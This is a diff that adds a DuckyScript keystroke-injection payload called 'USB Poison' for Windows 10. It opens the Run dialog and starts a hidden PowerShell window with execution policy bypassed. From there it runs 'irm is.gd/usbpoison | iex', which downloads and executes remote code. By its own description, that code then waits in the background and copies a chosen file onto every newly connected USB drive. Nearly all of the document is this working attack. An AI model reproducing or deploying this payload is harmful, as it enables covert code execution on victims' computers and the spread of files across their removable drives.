@@ -1,0 +1,16 @@
+REM Title: USB Poison
+REM Author: @beigeworm
+REM Description: This script runs quietly in the background waiting for new USB storage devices.
+REM Description: When a new storage device connects, this script will copy a desired file to the root of newly connected drive.
+REM Target: Windows 10
+
+REM some setup for dukie script
+DEFAULT_DELAY 100
+
+REM open powershell (remove "-W H" to show the window)
+DELAY 1000
+GUI r
+DELAY 750
+STRING powershell -NoP -Ep Bypass -W H -C $DLurl = 'YOUR_FILE_URL_HERE'; $File = 'NAME_OF_FILE_TO_COPY' irm is.gd/usbpoison | iex
+ENTER
+
